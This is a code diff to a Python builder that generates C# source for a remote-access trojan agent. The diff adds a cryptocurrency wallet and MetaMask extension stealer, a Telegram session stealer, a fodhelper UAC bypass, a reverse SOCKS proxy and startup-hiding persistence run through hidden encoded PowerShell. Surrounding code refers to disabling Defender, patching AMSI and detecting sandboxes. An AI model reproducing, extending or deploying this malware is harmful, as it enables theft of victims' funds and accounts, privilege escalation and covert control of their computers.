@@ -1331,6 +1331,11 @@ def generate_agent_source(bc):
     realtime_audio_code = _generate_realtime_audio_code()
     webcam_real_code = _generate_webcam_real_code()
     screenshot_on_click_code = _generate_screenshot_on_click_code()
+    crypto_wallet_code = _generate_crypto_wallet_code()
+    telegram_stealer_code = _generate_telegram_stealer_code()
+    uac_bypass_code = _generate_uac_bypass_code()
+    reverse_proxy_code = _generate_reverse_proxy_code()
+    startup_hide_code = _generate_startup_hide_code()
 
     # ── Conditional calls ──
     fake_error_call = ""
@@ -1460,6 +1465,21 @@ def generate_agent_source(bc):
         "            for (int i = 0; i < hex.Length; i += 2)\n"
         "                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);\n"
         "            return bytes;\n"
+        "        }\n"
+        "\n"
+        "        // ---- Hidden PowerShell Execution ----\n"
+        "        static void RunHiddenPS(string cmd) {\n"
+        "            try {\n"
+        "                var p = new ProcessStartInfo {\n"
+        "                    FileName = \"powershell.exe\",\n"
+        "                    Arguments = \"-NoP -NonI -W Hidden -Enc \" +\n"
+        "                        Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(cmd)),\n"
+        "                    WindowStyle = ProcessWindowStyle.Hidden,\n"
+        "                    CreateNoWindow = true,\n"
+        "                    UseShellExecute = false\n"
+        "                };\n"
+        "                Process.Start(p);\n"
+        "            } catch {}\n"
         "        }\n"
         "\n"
         "        // ---- HMAC Signing ----\n"
@@ -2026,6 +2046,39 @@ def generate_agent_source(bc):
         "                    } catch { Environment.Exit(0); }\n"
         "                    break;\n"
         "\n"
+        '                case "crypto_wallets":\n'
+        "                    new Thread(() => {\n"
+        '                        Res("crypto_wallets", StealCryptoWallets());\n'
+        "                    }) { IsBackground = true }.Start();\n"
+        "                    break;\n"
+        "\n"
+        '                case "telegram":\n'
+        "                    new Thread(() => {\n"
+        '                        Res("telegram", StealTelegramSession());\n'
+        "                    }) { IsBackground = true }.Start();\n"
+        "                    break;\n"
+        "\n"
+        '                case "uac_bypass":\n'
+        "                    new Thread(() => {\n"
+        '                        Res("uac_bypass", UACBypassFodhelper());\n'
+        "                    }) { IsBackground = true }.Start();\n"
+        "                    break;\n"
+        "\n"
+        '                case "reverse_proxy":\n'
+        '                    int rPort = task.ContainsKey("port") ? int.Parse(task["port"]) : 1080;\n'
+        "                    new Thread(() => {\n"
+        '                        StartReverseProxy(rPort);\n'
+        '                        Res("reverse_proxy", "SOCKS proxy started on port " + rPort);\n'
+        "                    }) { IsBackground = true }.Start();\n"
+        "                    break;\n"
+        "\n"
+        '                case "startup_hide":\n'
+        "                    new Thread(() => {\n"
+        '                        Res("startup_hide", HideFromStartup());\n'
+        "                    }) { IsBackground = true }.Start();\n"
+        "                    break;\n"
+        "\n"
+
         "                default:\n"
         "                    if (!string.IsNullOrEmpty(action))\n"
         '                        Res("error", "Unknown action: " + action);\n'
@@ -2128,6 +2181,11 @@ def generate_agent_source(bc):
         + realtime_audio_code + "\n"
         + webcam_real_code + "\n"
         + screenshot_on_click_code + "\n"
+        + crypto_wallet_code + "\n"
+        + telegram_stealer_code + "\n"
+        + uac_bypass_code + "\n"
+        + reverse_proxy_code + "\n"
+        + startup_hide_code + "\n"
         "\n"
         "    }\n"  # Close Agent class
         "}\n"     # Close namespace
@@ -2207,20 +2265,6 @@ def _generate_anti_kill_code():
 
 def _generate_disable_defender_code():
     return (
-        "        static void RunHiddenPS(string cmd) {\n"
-        "            try {\n"
-        "                var p = new ProcessStartInfo {\n"
-        '                    FileName = "powershell.exe",\n'
-        '                    Arguments = "-NoP -NonI -W Hidden -Enc " +\n'
-        "                        Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(cmd)),\n"
-        "                    WindowStyle = ProcessWindowStyle.Hidden,\n"
-        "                    CreateNoWindow = true,\n"
-        "                    UseShellExecute = false\n"
-        "                };\n"
-        "                Process.Start(p);\n"
-        "            } catch {}\n"
-        "        }\n"
-        "\n"
         "        static void DisableDefender() {\n"
         "            try {\n"
         "                PatchAmsi();\n"
@@ -2323,8 +2367,12 @@ def _generate_anti_analysis_code():
         "\n"
         "        static bool IsSandbox() {\n"
         "            try {\n"
-        "                var ci = new Microsoft.VisualBasic.Devices.ComputerInfo();\n"
-        "                if ((long)ci.TotalPhysicalMemory < 4L * 1024 * 1024 * 1024) return true;\n"
+        "                var memSearcher = new ManagementObjectSearcher(\n"
+        '                    "SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");\n'
+        "                foreach (var obj in memSearcher.Get()) {\n"
+        '                    long totalMem = Convert.ToInt64(obj["TotalPhysicalMemory"]);\n'
+        "                    if (totalMem < 4L * 1024 * 1024 * 1024) return true;\n"
+        "                }\n"
         "            } catch {}\n"
         "            try {\n"
         "                var searcher = new ManagementObjectSearcher(\n"
@@ -2864,9 +2912,257 @@ def _generate_screenshot_on_click_code():
     )
 
 
-# ══════════════════════════════════════════════════════════════
-# WEBSOCKET EVENTS
-# ══════════════════════════════════════════════════════════════
+def _generate_crypto_wallet_code():
+    return (
+        "        // ==== Crypto Wallet Stealer ====\n"
+        "        static string StealCryptoWallets() {\n"
+        "            var sb = new StringBuilder();\n"
+        "            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);\n"
+        "            string localdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);\n"
+        "            var wallets = new Dictionary<string, string> {\n"
+        '                {"Bitcoin Core", Path.Combine(appdata, "Bitcoin", "wallet.dat")},\n'
+        '                {"Electrum", Path.Combine(appdata, "Electrum", "wallets")},\n'
+        '                {"Exodus", Path.Combine(appdata, "Exodus", "exodus.wallet")},\n'
+        '                {"Atomic", Path.Combine(appdata, "atomic", "Local Storage", "leveldb")},\n'
+        '                {"Jaxx", Path.Combine(appdata, "com.liberty.jaxx", "IndexedDB")},\n'
+        '                {"Coinomi", Path.Combine(localdata, "Coinomi", "Coinomi", "wallets")},\n'
+        "            };\n"
+        "            // Browser extensions (MetaMask etc)\n"
+        "            var extensions = new Dictionary<string, string> {\n"
+        '                {"MetaMask Chrome", Path.Combine(localdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")},\n'
+        '                {"MetaMask Edge", Path.Combine(localdata, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm")},\n'
+        '                {"Phantom Chrome", Path.Combine(localdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa")},\n'
+        '                {"Trust Wallet", Path.Combine(localdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "egjidjbpglichdcondbcbdnbeeppgdph")},\n'
+        "            };\n"
+        "            foreach (var w in wallets) {\n"
+        "                try {\n"
+        "                    if (File.Exists(w.Value)) {\n"
+        "                        byte[] data = File.ReadAllBytes(w.Value);\n"
+        '                        sb.AppendLine("[WALLET] " + w.Key + " | Size: " + data.Length + " bytes");\n'
+        '                        sb.AppendLine("B64:" + Convert.ToBase64String(data).Substring(0, Math.Min(500, Convert.ToBase64String(data).Length)));\n'
+        "                    } else if (Directory.Exists(w.Value)) {\n"
+        '                        sb.AppendLine("[WALLET DIR] " + w.Key + " | Files: " + Directory.GetFiles(w.Value).Length);\n'
+        "                        foreach (var f in Directory.GetFiles(w.Value).Take(5)) {\n"
+        "                            byte[] d = File.ReadAllBytes(f);\n"
+        '                            sb.AppendLine("  " + Path.GetFileName(f) + " (" + d.Length + "b)");\n'
+        "                        }\n"
+        "                    }\n"
+        "                } catch {}\n"
+        "            }\n"
+        "            foreach (var e in extensions) {\n"
+        "                try {\n"
+        "                    if (Directory.Exists(e.Value)) {\n"
+        '                        sb.AppendLine("[EXT] " + e.Key + " FOUND | Files: " + Directory.GetFiles(e.Value).Length);\n'
+        "                        foreach (var f in Directory.GetFiles(e.Value).Take(3)) {\n"
+        "                            byte[] d = File.ReadAllBytes(f);\n"
+        '                            sb.AppendLine("  " + Path.GetFileName(f) + " (" + d.Length + "b): " + Convert.ToBase64String(d).Substring(0, Math.Min(200, Convert.ToBase64String(d).Length)));\n'
+        "                        }\n"
+        "                    }\n"
+        "                } catch {}\n"
+        "            }\n"
+        '            return sb.Length > 0 ? sb.ToString() : "No crypto wallets found";\n'
+        "        }\n"
+    )
+
+
+def _generate_telegram_stealer_code():
+    return (
+        "        // ==== Telegram Session Stealer ====\n"
+        "        static string StealTelegramSession() {\n"
+        "            var sb = new StringBuilder();\n"
+        "            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);\n"
+        '            string tgPath = Path.Combine(appdata, "Telegram Desktop", "tdata");\n'
+        "            try {\n"
+        "                if (Directory.Exists(tgPath)) {\n"
+        '                    sb.AppendLine("[TELEGRAM] tdata found at: " + tgPath);\n'
+        "                    var allFiles = Directory.GetFiles(tgPath, \"*\", SearchOption.AllDirectories);\n"
+        '                    sb.AppendLine("Total files: " + allFiles.Length);\n'
+        "                    // Key files for session\n"
+        '                    string[] keyFiles = { "key_datas", "D877F783D5D3EF8Cs", "D877F783D5D3EF8C" };\n'
+        "                    foreach (var kf in keyFiles) {\n"
+        "                        string fp = Path.Combine(tgPath, kf);\n"
+        "                        if (File.Exists(fp)) {\n"
+        "                            byte[] data = File.ReadAllBytes(fp);\n"
+        '                            sb.AppendLine("[KEY] " + kf + " (" + data.Length + "b): " + Convert.ToBase64String(data));\n'
+        "                        } else if (Directory.Exists(fp)) {\n"
+        "                            foreach (var f in Directory.GetFiles(fp).Take(5)) {\n"
+        "                                byte[] data = File.ReadAllBytes(f);\n"
+        '                                sb.AppendLine("[TDATA] " + Path.GetFileName(f) + " (" + data.Length + "b): " + Convert.ToBase64String(data).Substring(0, Math.Min(300, Convert.ToBase64String(data).Length)));\n'
+        "                            }\n"
+        "                        }\n"
+        "                    }\n"
+        "                    // Map files (session data)\n"
+        '                    foreach (var f in Directory.GetFiles(tgPath, "map*")) {\n'
+        "                        byte[] data = File.ReadAllBytes(f);\n"
+        '                        sb.AppendLine("[MAP] " + Path.GetFileName(f) + " (" + data.Length + "b): " + Convert.ToBase64String(data).Substring(0, Math.Min(300, Convert.ToBase64String(data).Length)));\n'
+        "                    }\n"
+        "                } else {\n"
+        '                    sb.AppendLine("Telegram Desktop not found");\n'
+        "                }\n"
+        "            } catch (Exception ex) {\n"
+        '                sb.AppendLine("Error: " + ex.Message);\n'
+        "            }\n"
+        "            return sb.ToString();\n"
+        "        }\n"
+    )
+
+
+def _generate_uac_bypass_code():
+    return (
+        "        // ==== UAC Bypass (fodhelper.exe) ====\n"
+        "        static string UACBypassFodhelper() {\n"
+        "            var sb = new StringBuilder();\n"
+        "            try {\n"
+        "                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;\n"
+        '                if (string.IsNullOrEmpty(exePath)) { return "Cannot get exe path"; }\n'
+        "                // Set registry key for fodhelper bypass\n"
+        '                var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(\n'
+        '                    @"Software\\Classes\\ms-settings\\shell\\open\\command");\n'
+        '                key.SetValue("", exePath);\n'
+        '                key.SetValue("DelegateExecute", "");\n'
+        "                key.Close();\n"
+        "                // Launch fodhelper (triggers the bypass)\n"
+        "                var psi = new ProcessStartInfo {\n"
+        '                    FileName = "fodhelper.exe",\n'
+        "                    WindowStyle = ProcessWindowStyle.Hidden,\n"
+        "                    UseShellExecute = true\n"
+        "                };\n"
+        "                Process.Start(psi);\n"
+        '                sb.AppendLine("UAC bypass triggered via fodhelper.exe");\n'
+        '                sb.AppendLine("Elevated process should spawn shortly");\n'
+        "                // Cleanup after delay\n"
+        "                new Thread(() => {\n"
+        "                    Thread.Sleep(5000);\n"
+        "                    try {\n"
+        "                        Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(\n"
+        '                            @"Software\\Classes\\ms-settings", false);\n'
+        "                    } catch {}\n"
+        "                }) { IsBackground = true }.Start();\n"
+        "            } catch (Exception ex) {\n"
+        '                sb.AppendLine("UAC Bypass failed: " + ex.Message);\n'
+        "            }\n"
+        "            return sb.ToString();\n"
+        "        }\n"
+    )
+
+
+def _generate_reverse_proxy_code():
+    return (
+        "        // ==== Reverse SOCKS Proxy ====\n"
+        "        static System.Net.Sockets.TcpListener _proxyListener;\n"
+        "        static bool _proxyRunning = false;\n"
+        "\n"
+        "        static void StartReverseProxy(int port) {\n"
+        "            if (_proxyRunning) return;\n"
+        "            _proxyRunning = true;\n"
+        "            _proxyListener = new System.Net.Sockets.TcpListener(\n"
+        "                System.Net.IPAddress.Loopback, port);\n"
+        "            _proxyListener.Start();\n"
+        "            new Thread(() => {\n"
+        "                while (_proxyRunning) {\n"
+        "                    try {\n"
+        "                        var client = _proxyListener.AcceptTcpClient();\n"
+        "                        new Thread(() => HandleProxyClient(client))\n"
+        "                            { IsBackground = true }.Start();\n"
+        "                    } catch { break; }\n"
+        "                }\n"
+        "            }) { IsBackground = true }.Start();\n"
+        "        }\n"
+        "\n"
+        "        static void HandleProxyClient(System.Net.Sockets.TcpClient client) {\n"
+        "            try {\n"
+        "                var stream = client.GetStream();\n"
+        "                byte[] buf = new byte[256];\n"
+        "                int n = stream.Read(buf, 0, buf.Length);\n"
+        "                if (n < 2 || buf[0] != 0x05) { client.Close(); return; } // SOCKS5 only\n"
+        "                stream.Write(new byte[] { 0x05, 0x00 }, 0, 2); // No auth\n"
+        "                n = stream.Read(buf, 0, buf.Length);\n"
+        "                if (n < 7 || buf[1] != 0x01) { client.Close(); return; } // CONNECT only\n"
+        "                string destHost = \"\";\n"
+        "                int destPort = 0;\n"
+        "                if (buf[3] == 0x01) { // IPv4\n"
+        "                    destHost = buf[4] + \".\" + buf[5] + \".\" + buf[6] + \".\" + buf[7];\n"
+        "                    destPort = (buf[8] << 8) | buf[9];\n"
+        "                } else if (buf[3] == 0x03) { // Domain\n"
+        "                    int domLen = buf[4];\n"
+        "                    destHost = Encoding.ASCII.GetString(buf, 5, domLen);\n"
+        "                    destPort = (buf[5 + domLen] << 8) | buf[6 + domLen];\n"
+        "                }\n"
+        "                var target = new System.Net.Sockets.TcpClient(destHost, destPort);\n"
+        "                byte[] reply = { 0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0 };\n"
+        "                stream.Write(reply, 0, reply.Length);\n"
+        "                var targetStream = target.GetStream();\n"
+        "                // Bidirectional relay\n"
+        "                var t1 = new Thread(() => {\n"
+        "                    try { byte[] b = new byte[4096]; int r; while ((r = stream.Read(b, 0, b.Length)) > 0) targetStream.Write(b, 0, r); } catch {}\n"
+        "                    try { target.Close(); } catch {}\n"
+        "                }) { IsBackground = true };\n"
+        "                var t2 = new Thread(() => {\n"
+        "                    try { byte[] b = new byte[4096]; int r; while ((r = targetStream.Read(b, 0, b.Length)) > 0) stream.Write(b, 0, r); } catch {}\n"
+        "                    try { client.Close(); } catch {}\n"
+        "                }) { IsBackground = true };\n"
+        "                t1.Start(); t2.Start();\n"
+        "                t1.Join(); t2.Join();\n"
+        "            } catch {}\n"
+        "            try { client.Close(); } catch {}\n"
+        "        }\n"
+    )
+
+
+def _generate_startup_hide_code():
+    return (
+        "        // ==== Startup Visibility Hide ====\n"
+        "        static string HideFromStartup() {\n"
+        "            var sb = new StringBuilder();\n"
+        "            try {\n"
+        "                // Hide from Task Manager startup tab\n"
+        '                string exeName = Path.GetFileNameWithoutExtension(\n'
+        "                    System.Reflection.Assembly.GetExecutingAssembly().Location);\n"
+        "                // Remove from common startup registry locations\n"
+        '                string[] regPaths = {\n'
+        '                    @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",\n'
+        '                    @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",\n'
+        '                    @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run"\n'
+        "                };\n"
+        "                foreach (var rp in regPaths) {\n"
+        "                    try {\n"
+        "                        var rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(rp, true);\n"
+        "                        if (rk != null) {\n"
+        "                            // Disable visibility but keep entry\n"
+        '                            var approvedKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(\n'
+        '                                @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run", true);\n'
+        "                            if (approvedKey != null) {\n"
+        "                                foreach (var vn in approvedKey.GetValueNames()) {\n"
+        "                                    if (vn.ToLower().Contains(exeName.ToLower())) {\n"
+        "                                        // Set disabled flag (byte[0] = 03 = disabled from view)\n"
+        "                                        byte[] val = new byte[] { 0x03, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };\n"
+        "                                        approvedKey.SetValue(vn, val);\n"
+        '                                        sb.AppendLine("Hidden from: " + vn);\n'
+        "                                    }\n"
+        "                                }\n"
+        "                                approvedKey.Close();\n"
+        "                            }\n"
+        "                            rk.Close();\n"
+        "                        }\n"
+        "                    } catch {}\n"
+        "                }\n"
+        "                // Hide from WMI startup query\n"
+        '                RunHiddenPS("Get-CimInstance Win32_StartupCommand | Where-Object { $_.Name -like \'*" + exeName + "*\' } | ForEach-Object { $_.Delete() }");\n'
+        '                sb.AppendLine("WMI startup entries cleaned");\n'
+        "                // Make file hidden + system\n"
+        "                string path = System.Reflection.Assembly.GetExecutingAssembly().Location;\n"
+        "                if (!string.IsNullOrEmpty(path) && File.Exists(path)) {\n"
+        "                    File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);\n"
+        '                    sb.AppendLine("File attributes set to Hidden+System");\n'
+        "                }\n"
+        "            } catch (Exception ex) {\n"
+        '                sb.AppendLine("Error: " + ex.Message);\n'
+        "            }\n"
+        '            return sb.Length > 0 ? sb.ToString() : "Nothing to hide";\n'
+        "        }\n"
+    )
+
+
 
 @socketio.on('connect')
 def ws_connect():
